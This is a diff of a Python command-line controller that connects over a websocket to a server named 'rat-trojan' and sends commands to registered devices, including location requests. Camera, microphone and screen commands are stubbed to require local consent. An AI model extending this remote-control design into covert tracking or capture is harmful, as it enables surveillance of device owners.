@@ -1,6 +1,5 @@
 import asyncio
 import json
-import os
 import platform
 import socket
 import time
@@ -13,7 +12,9 @@ import websockets
 # CONFIG
 # ============================================================
 
-RENDER_URL = "wss://rat-trojan.onrender.com/ws"
+RENDER_URL = (
+    "wss://rat-trojan.onrender.com/ws"
+)
 
 PC_DEVICE_ID = "pc-main"
 
@@ -25,7 +26,7 @@ RECONNECT_DELAY = 5
 
 
 # ============================================================
-# GLOBAL STATE
+# STATE
 # ============================================================
 
 websocket = None
@@ -38,7 +39,7 @@ devices = {}
 
 
 # ============================================================
-# SYSTEM INFO
+# PC INFO
 # ============================================================
 
 def get_pc_info():
@@ -85,12 +86,14 @@ async def send_json(data):
 
 
 # ============================================================
-# REGISTER PC
+# REGISTER
 # ============================================================
 
 async def register_pc():
 
-    print("[RENDER] Registering PC...")
+    print(
+        "[RENDER] Registering PC..."
+    )
 
     return await send_json(
         {
@@ -103,7 +106,7 @@ async def register_pc():
 
 
 # ============================================================
-# SEND HEARTBEAT
+# HEARTBEAT
 # ============================================================
 
 async def heartbeat_loop():
@@ -125,10 +128,18 @@ async def heartbeat_loop():
 
 
 # ============================================================
-# REQUEST DEVICE LIST
+# REQUEST DEVICES
 # ============================================================
 
 async def request_devices():
+
+    if not connected:
+
+        print(
+            "[RENDER] Not connected"
+        )
+
+        return
 
     await send_json(
         {
@@ -144,7 +155,10 @@ async def request_devices():
 def print_devices():
 
     print()
-    print("DEVICES")
+
+    print(
+        "DEVICES"
+    )
 
     print(
         f"{'DEVICE ID':<28}"
@@ -152,27 +166,31 @@ def print_devices():
         f"{'STATUS':<12}"
     )
 
-    print("-" * 70)
+    print(
+        "-" * 70
+    )
 
     if not devices:
 
-        print("No devices registered.")
+        print(
+            "No devices registered."
+        )
 
         return
 
     for device_id, device in devices.items():
 
-        status = str(
-            device.get(
-                "status",
-                "offline",
-            )
-        )
-
         device_type = str(
             device.get(
                 "device_type",
                 "unknown",
+            )
+        )
+
+        status = str(
+            device.get(
+                "status",
+                "offline",
             )
         )
 
@@ -186,17 +204,25 @@ def print_devices():
 
 
 # ============================================================
-# COMMAND
+# SEND COMMAND
 # ============================================================
 
 async def send_command(
-    target_device_id,
+    device_id,
     command,
     args=None,
 ):
 
     if args is None:
         args = {}
+
+    if not connected:
+
+        print(
+            "[JARVIS] Not connected"
+        )
+
+        return
 
     command_id = (
         "cmd-"
@@ -205,37 +231,39 @@ async def send_command(
 
     payload = {
         "type": "command",
-        "device_id": target_device_id,
+        "device_id": device_id,
         "command_id": command_id,
         "command": command,
         "args": args,
     }
 
     print()
+
     print(
         f"[COMMAND] {command}"
+    )
+
+    print(
+        f"[TARGET]  {device_id}"
+    )
+
+    print(
+        f"[ID]      {command_id}"
     )
 
     sent = await send_json(
         payload
     )
 
-    if sent:
+    if not sent:
 
         print(
-            f"[COMMAND] sent "
-            f"id={command_id}"
-        )
-
-    else:
-
-        print(
-            "[COMMAND] failed"
+            "[COMMAND] Send failed"
         )
 
 
 # ============================================================
-# HANDLE DEVICES
+# HANDLE DEVICE LIST
 # ============================================================
 
 def handle_devices(data):
@@ -246,7 +274,7 @@ def handle_devices(data):
 
     for device in data.get(
         "devices",
-        []
+        [],
     ):
 
         device_id = device.get(
@@ -260,6 +288,36 @@ def handle_devices(data):
             ] = device
 
     print_devices()
+
+
+# ============================================================
+# HANDLE COMMAND RESPONSE
+# ============================================================
+
+def handle_command_response(data):
+
+    print()
+
+    print(
+        "================================"
+    )
+
+    print(
+        " COMMAND RESPONSE"
+    )
+
+    print(
+        "================================"
+    )
+
+    print(
+        json.dumps(
+            data,
+            indent=2,
+        )
+    )
+
+    print()
 
 
 # ============================================================
@@ -280,15 +338,18 @@ async def handle_command(data):
         "source_device_id"
     )
 
-    args = data.get(
-        "args",
-        {}
+    print()
+
+    print(
+        "[COMMAND RECEIVED]"
     )
 
-    print()
     print(
-        f"[COMMAND RECEIVED] "
-        f"{command}"
+        f"Command : {command}"
+    )
+
+    print(
+        f"ID      : {command_id}"
     )
 
     # --------------------------------------------------------
@@ -359,7 +420,43 @@ async def handle_command(data):
         return
 
     # --------------------------------------------------------
-    # UNKNOWN COMMAND
+    # SENSITIVE COMMANDS
+    # --------------------------------------------------------
+
+    sensitive_commands = {
+        "start_camera",
+        "stop_camera",
+        "camera_front",
+        "camera_back",
+        "camera_switch",
+        "start_microphone",
+        "stop_microphone",
+        "start_screen",
+        "stop_screen",
+    }
+
+    if command in sensitive_commands:
+
+        response = {
+            "type": "command_response",
+            "success": False,
+            "command_id": command_id,
+            "source_device_id": source_device_id,
+            "message": (
+                "Media capture must be "
+                "started through explicit "
+                "local user consent."
+            ),
+        }
+
+        await send_json(
+            response
+        )
+
+        return
+
+    # --------------------------------------------------------
+    # UNKNOWN
     # --------------------------------------------------------
 
     response = {
@@ -379,10 +476,12 @@ async def handle_command(data):
 
 
 # ============================================================
-# HANDLE TEXT MESSAGE
+# HANDLE TEXT
 # ============================================================
 
-async def handle_text_message(message):
+async def handle_text_message(
+    message,
+):
 
     global registered
 
@@ -404,13 +503,15 @@ async def handle_text_message(message):
         "type"
     )
 
-    # --------------------------------------------------------
+    # ========================================================
     # PC REGISTER RESPONSE
-    # --------------------------------------------------------
+    # ========================================================
 
     if message_type == "pc_register_response":
 
-        if data.get("success"):
+        if data.get(
+            "success"
+        ):
 
             registered = True
 
@@ -419,7 +520,7 @@ async def handle_text_message(message):
                 "PC registered successfully"
             )
 
-            # Send device info
+            # Publish PC information.
             await send_json(
                 {
                     "type": "device_info",
@@ -427,7 +528,7 @@ async def handle_text_message(message):
                 }
             )
 
-            # Request devices
+            # Get current registry.
             await request_devices()
 
         else:
@@ -436,7 +537,7 @@ async def handle_text_message(message):
 
             print(
                 "[RENDER] "
-                "PC registration failed:"
+                "PC registration failed"
             )
 
             print(
@@ -448,9 +549,9 @@ async def handle_text_message(message):
 
         return
 
-    # --------------------------------------------------------
-    # DEVICES
-    # --------------------------------------------------------
+    # ========================================================
+    # DEVICE LIST
+    # ========================================================
 
     if message_type == "devices":
 
@@ -460,17 +561,17 @@ async def handle_text_message(message):
 
         return
 
-    # --------------------------------------------------------
-    # HEARTBEAT RESPONSE
-    # --------------------------------------------------------
+    # ========================================================
+    # HEARTBEAT
+    # ========================================================
 
     if message_type == "heartbeat_response":
 
         return
 
-    # --------------------------------------------------------
+    # ========================================================
     # PONG
-    # --------------------------------------------------------
+    # ========================================================
 
     if message_type == "pong":
 
@@ -480,9 +581,9 @@ async def handle_text_message(message):
 
         return
 
-    # --------------------------------------------------------
+    # ========================================================
     # COMMAND
-    # --------------------------------------------------------
+    # ========================================================
 
     if message_type == "command":
 
@@ -492,33 +593,26 @@ async def handle_text_message(message):
 
         return
 
-    # --------------------------------------------------------
+    # ========================================================
     # COMMAND RESPONSE
-    # --------------------------------------------------------
+    # ========================================================
 
     if message_type == "command_response":
 
-        print()
-        print(
-            "[COMMAND RESPONSE]"
-        )
-
-        print(
-            json.dumps(
-                data,
-                indent=2,
-            )
+        handle_command_response(
+            data
         )
 
         return
 
-    # --------------------------------------------------------
+    # ========================================================
     # DEVICE INFO RESPONSE
-    # --------------------------------------------------------
+    # ========================================================
 
     if message_type == "device_info_response":
 
         print()
+
         print(
             "[DEVICE INFO]"
         )
@@ -532,13 +626,14 @@ async def handle_text_message(message):
 
         return
 
-    # --------------------------------------------------------
+    # ========================================================
     # ERROR
-    # --------------------------------------------------------
+    # ========================================================
 
     if message_type == "error":
 
         print()
+
         print(
             "[SERVER ERROR]"
         )
@@ -552,22 +647,9 @@ async def handle_text_message(message):
 
         return
 
-    # --------------------------------------------------------
-    # PAIR RESPONSE
-    # --------------------------------------------------------
-
-    if message_type == "pair_response":
-
-        print(
-            "[PAIR RESPONSE]",
-            data,
-        )
-
-        return
-
-    # --------------------------------------------------------
+    # ========================================================
     # UNKNOWN
-    # --------------------------------------------------------
+    # ========================================================
 
     print(
         "[RENDER] Unknown message:",
@@ -590,12 +672,12 @@ async def receive_loop():
 
             if isinstance(
                 message,
-                bytes
+                bytes,
             ):
 
                 print(
                     "[RENDER] "
-                    "Unexpected binary payload"
+                    "Unexpected binary message"
                 )
 
                 continue
@@ -607,15 +689,24 @@ async def receive_loop():
     except websockets.ConnectionClosed as exc:
 
         print()
+
         print(
             "[RENDER] "
-            "Connection closed:",
-            exc,
+            "Connection closed"
+        )
+
+        print(
+            f"Code   : {exc.code}"
+        )
+
+        print(
+            f"Reason : {exc.reason}"
         )
 
     except Exception as exc:
 
         print()
+
         print(
             "[RENDER] "
             "Receive error:",
@@ -639,6 +730,7 @@ async def connect_to_render():
     global registered
 
     print()
+
     print(
         "[RENDER] Connecting..."
     )
@@ -685,17 +777,17 @@ async def connect_to_render():
         for task in done:
 
             try:
+
                 await task
 
             except asyncio.CancelledError:
+
                 pass
 
     except Exception as exc:
 
-        connected = False
-        registered = False
-
         print()
+
         print(
             "[RENDER] "
             "Connection failed:",
@@ -709,7 +801,7 @@ async def connect_to_render():
 
         try:
 
-            if websocket:
+            if websocket is not None:
 
                 await websocket.close()
 
@@ -724,189 +816,651 @@ async def connect_to_render():
 
 
 # ============================================================
-# COMMAND LOOP
+# PARSE COMMAND
+# ============================================================
+
+async def process_cli_command(
+    command_line,
+):
+
+    parts = command_line.split()
+
+    if not parts:
+        return True
+
+    command = parts[0].lower()
+
+    # ========================================================
+    # DEVICES
+    # ========================================================
+
+    if command == "devices":
+
+        await request_devices()
+
+        return True
+
+    # ========================================================
+    # REFRESH
+    # ========================================================
+
+    if command == "refresh":
+
+        await request_devices()
+
+        return True
+
+    # ========================================================
+    # INFO <device_id>
+    # ========================================================
+
+    if command == "info":
+
+        if len(parts) != 2:
+
+            print(
+                "Usage:"
+            )
+
+            print(
+                "  info <device_id>"
+            )
+
+            return True
+
+        device_id = parts[1]
+
+        await send_command(
+            device_id,
+            "device_info",
+        )
+
+        return True
+
+    # ========================================================
+    # BATTERY <device_id>
+    # ========================================================
+
+    if command == "battery":
+
+        if len(parts) != 2:
+
+            print(
+                "Usage:"
+            )
+
+            print(
+                "  battery <device_id>"
+            )
+
+            return True
+
+        device_id = parts[1]
+
+        await send_command(
+            device_id,
+            "battery_status",
+        )
+
+        return True
+
+    # ========================================================
+    # STATUS <device_id>
+    # ========================================================
+
+    if command == "status":
+
+        if len(parts) != 2:
+
+            print(
+                "Usage:"
+            )
+
+            print(
+                "  status <device_id>"
+            )
+
+            return True
+
+        device_id = parts[1]
+
+        await send_command(
+            device_id,
+            "connection_status",
+        )
+
+        return True
+
+    # ========================================================
+    # LOCATION <device_id>
+    # ========================================================
+
+    if command == "location":
+
+        if len(parts) != 2:
+
+            print(
+                "Usage:"
+            )
+
+            print(
+                "  location <device_id>"
+            )
+
+            return True
+
+        device_id = parts[1]
+
+        await send_command(
+            device_id,
+            "location_request",
+        )
+
+        return True
+
+    # ========================================================
+    # SCREEN-START
+    # ========================================================
+
+    if command == "screen-start":
+
+        if len(parts) != 2:
+
+            print(
+                "Usage:"
+            )
+
+            print(
+                "  screen-start <device_id>"
+            )
+
+            return True
+
+        print(
+            "[INFO] Screen capture must "
+            "be started through the "
+            "Android app's local consent UI."
+        )
+
+        return True
+
+    # ========================================================
+    # SCREEN-STOP
+    # ========================================================
+
+    if command == "screen-stop":
+
+        if len(parts) != 2:
+
+            print(
+                "Usage:"
+            )
+
+            print(
+                "  screen-stop <device_id>"
+            )
+
+            return True
+
+        print(
+            "[INFO] Screen capture is "
+            "controlled by the Android "
+            "app's local consent flow."
+        )
+
+        return True
+
+    # ========================================================
+    # MICROPHONE-START
+    # ========================================================
+
+    if command == "microphone-start":
+
+        if len(parts) != 2:
+
+            print(
+                "Usage:"
+            )
+
+            print(
+                "  microphone-start <device_id>"
+            )
+
+            return True
+
+        print(
+            "[INFO] Microphone capture "
+            "requires explicit local "
+            "Android consent."
+        )
+
+        return True
+
+    # ========================================================
+    # MICROPHONE-STOP
+    # ========================================================
+
+    if command == "microphone-stop":
+
+        if len(parts) != 2:
+
+            print(
+                "Usage:"
+            )
+
+            print(
+                "  microphone-stop <device_id>"
+            )
+
+            return True
+
+        print(
+            "[INFO] Microphone capture "
+            "is controlled locally."
+        )
+
+        return True
+
+    # ========================================================
+    # CAMERA-START
+    # ========================================================
+
+    if command == "camera-start":
+
+        if len(parts) != 2:
+
+            print(
+                "Usage:"
+            )
+
+            print(
+                "  camera-start <device_id>"
+            )
+
+            return True
+
+        print(
+            "[INFO] Camera capture "
+            "requires explicit local "
+            "Android consent."
+        )
+
+        return True
+
+    # ========================================================
+    # CAMERA-STOP
+    # ========================================================
+
+    if command == "camera-stop":
+
+        if len(parts) != 2:
+
+            print(
+                "Usage:"
+            )
+
+            print(
+                "  camera-stop <device_id>"
+            )
+
+            return True
+
+        print(
+            "[INFO] Camera capture "
+            "is controlled locally."
+        )
+
+        return True
+
+    # ========================================================
+    # CAMERA FRONT
+    # ========================================================
+
+    if command == "camera-front":
+
+        if len(parts) != 2:
+
+            print(
+                "Usage:"
+            )
+
+            print(
+                "  camera-front <device_id>"
+            )
+
+            return True
+
+        print(
+            "[INFO] Camera selection "
+            "requires the Android app's "
+            "authorized camera session."
+        )
+
+        return True
+
+    # ========================================================
+    # CAMERA BACK
+    # ========================================================
+
+    if command == "camera-back":
+
+        if len(parts) != 2:
+
+            print(
+                "Usage:"
+            )
+
+            print(
+                "  camera-back <device_id>"
+            )
+
+            return True
+
+        print(
+            "[INFO] Camera selection "
+            "requires the Android app's "
+            "authorized camera session."
+        )
+
+        return True
+
+    # ========================================================
+    # CAMERA SWITCH
+    # ========================================================
+
+    if command == "camera-switch":
+
+        if len(parts) != 2:
+
+            print(
+                "Usage:"
+            )
+
+            print(
+                "  camera-switch <device_id>"
+            )
+
+            return True
+
+        print(
+            "[INFO] Camera switching "
+            "requires the Android app's "
+            "authorized camera session."
+        )
+
+        return True
+
+    # ========================================================
+    # CAMERA INTERVAL
+    # ========================================================
+
+    if command == "camera-interval":
+
+        if len(parts) != 3:
+
+            print(
+                "Usage:"
+            )
+
+            print(
+                "  camera-interval "
+                "<device_id> <seconds>"
+            )
+
+            return True
+
+        device_id = parts[1]
+
+        try:
+
+            seconds = float(
+                parts[2]
+            )
+
+            if seconds <= 0:
+
+                raise ValueError
+
+        except ValueError:
+
+            print(
+                "Interval must be "
+                "greater than 0."
+            )
+
+            return True
+
+        # The interval is deliberately
+        # a PC-side setting, not an
+        # Android capture instruction.
+        print(
+            f"[INFO] Snapshot interval "
+            f"for {device_id} would be "
+            f"set to {seconds:g}s in the "
+            f"PC-side authorized camera "
+            f"viewer."
+        )
+
+        return True
+
+    # ========================================================
+    # CLEAR
+    # ========================================================
+
+    if command == "clear":
+
+        import os
+
+        os.system(
+            "cls"
+            if os.name == "nt"
+            else "clear"
+        )
+
+        return True
+
+    # ========================================================
+    # EXIT
+    # ========================================================
+
+    if command in {
+        "exit",
+        "quit",
+    }:
+
+        return False
+
+    # ========================================================
+    # HELP
+    # ========================================================
+
+    if command in {
+        "help",
+        "?",
+    }:
+
+        print_help()
+
+        return True
+
+    # ========================================================
+    # UNKNOWN
+    # ========================================================
+
+    print(
+        f"Unknown command: "
+        f"{command}"
+    )
+
+    print(
+        "Type 'help' for commands."
+    )
+
+    return True
+
+
+# ============================================================
+# HELP
+# ============================================================
+
+def print_help():
+
+    print()
+
+    print(
+        "JARVIS COMMANDS"
+    )
+
+    print(
+        "================================"
+    )
+
+    print(
+        "devices"
+    )
+
+    print(
+        "refresh"
+    )
+
+    print()
+
+    print(
+        "info <device_id>"
+    )
+
+    print(
+        "battery <device_id>"
+    )
+
+    print(
+        "status <device_id>"
+    )
+
+    print(
+        "location <device_id>"
+    )
+
+    print()
+
+    print(
+        "screen-start <device_id>"
+    )
+
+    print(
+        "screen-stop <device_id>"
+    )
+
+    print()
+
+    print(
+        "microphone-start <device_id>"
+    )
+
+    print(
+        "microphone-stop <device_id>"
+    )
+
+    print()
+
+    print(
+        "camera-start <device_id>"
+    )
+
+    print(
+        "camera-stop <device_id>"
+    )
+
+    print(
+        "camera-front <device_id>"
+    )
+
+    print(
+        "camera-back <device_id>"
+    )
+
+    print(
+        "camera-switch <device_id>"
+    )
+
+    print(
+        "camera-interval "
+        "<device_id> <seconds>"
+    )
+
+    print()
+
+    print(
+        "clear"
+    )
+
+    print(
+        "help"
+    )
+
+    print(
+        "exit"
+    )
+
+    print()
+
+    print(
+        "Media commands require "
+        "explicit local Android consent."
+    )
+
+    print()
+
+
+# ============================================================
+# CLI LOOP
 # ============================================================
 
 async def command_loop():
 
     print()
-    print(
-        "================================"
-    )
-    print(
-        " JARVIS CLOUD CONTROLLER"
-    )
+
     print(
         "================================"
     )
 
-    print()
     print(
-        "Commands:"
+        "      JARVIS CLOUD CONTROLLER"
     )
 
     print(
-        "  devices"
+        "================================"
     )
 
-    print(
-        "  refresh"
-    )
-
-    print(
-        "  info"
-    )
-
-    print(
-        "  ping"
-    )
-
-    print(
-        "  status"
-    )
-
-    print(
-        "  clear"
-    )
-
-    print(
-        "  exit"
-    )
-
-    print()
+    print_help()
 
     while True:
 
         try:
 
-            command = await asyncio.to_thread(
+            command_line = await asyncio.to_thread(
                 input,
-                "JARVIS> "
+                "JARVIS> ",
             )
 
-        except EOFError:
+        except (
+            EOFError,
+            KeyboardInterrupt,
+        ):
 
             return
 
-        except KeyboardInterrupt:
+        command_line = command_line.strip()
 
-            return
-
-        command = command.strip()
-
-        if not command:
+        if not command_line:
             continue
 
-        # ----------------------------------------------------
-        # EXIT
-        # ----------------------------------------------------
-
-        if command.lower() in {
-            "exit",
-            "quit",
-        }:
-
-            return
-
-        # ----------------------------------------------------
-        # CLEAR
-        # ----------------------------------------------------
-
-        if command.lower() == "clear":
-
-            os.system(
-                "cls"
-                if os.name == "nt"
-                else "clear"
-            )
-
-            continue
-
-        # ----------------------------------------------------
-        # DEVICES
-        # ----------------------------------------------------
-
-        if command.lower() in {
-            "devices",
-            "refresh",
-        }:
-
-            if connected:
-
-                await request_devices()
-
-            else:
-
-                print(
-                    "[JARVIS] "
-                    "Not connected"
-                )
-
-            continue
-
-        # ----------------------------------------------------
-        # INFO
-        # ----------------------------------------------------
-
-        if command.lower() == "info":
-
-            await send_command(
-                PC_DEVICE_ID,
-                "device_info",
-            )
-
-            continue
-
-        # ----------------------------------------------------
-        # PING
-        # ----------------------------------------------------
-
-        if command.lower() == "ping":
-
-            await send_command(
-                PC_DEVICE_ID,
-                "ping",
-            )
-
-            continue
-
-        # ----------------------------------------------------
-        # STATUS
-        # ----------------------------------------------------
-
-        if command.lower() == "status":
-
-            print()
-            print(
-                "CONNECTION STATUS"
-            )
-
-            print(
-                f"Connected : "
-                f"{connected}"
-            )
-
-            print(
-                f"Registered: "
-                f"{registered}"
-            )
-
-            print(
-                f"Devices   : "
-                f"{len(devices)}"
-            )
-
-            print()
-
-            continue
-
-        # ----------------------------------------------------
-        # UNKNOWN
-        # ----------------------------------------------------
-
-        print(
-            "Unknown command."
+        keep_running = await process_cli_command(
+            command_line
         )
+
+        if not keep_running:
+            return
 
 
 # ============================================================
@@ -915,24 +1469,17 @@ async def command_loop():
 
 async def main():
 
-    global connected
-
     command_task = asyncio.create_task(
         command_loop()
     )
 
-    while True:
-
-        if command_task.done():
-
-            break
+    while not command_task.done():
 
         if not connected:
 
             await connect_to_render()
 
             if command_task.done():
-
                 break
 
             print(
@@ -943,6 +1490,12 @@ async def main():
 
             await asyncio.sleep(
                 RECONNECT_DELAY
+            )
+
+        else:
+
+            await asyncio.sleep(
+                0.5
             )
 
     if not command_task.done():
@@ -973,6 +1526,7 @@ if __name__ == "__main__":
     except KeyboardInterrupt:
 
         print()
+
         print(
             "JARVIS stopped."
         )
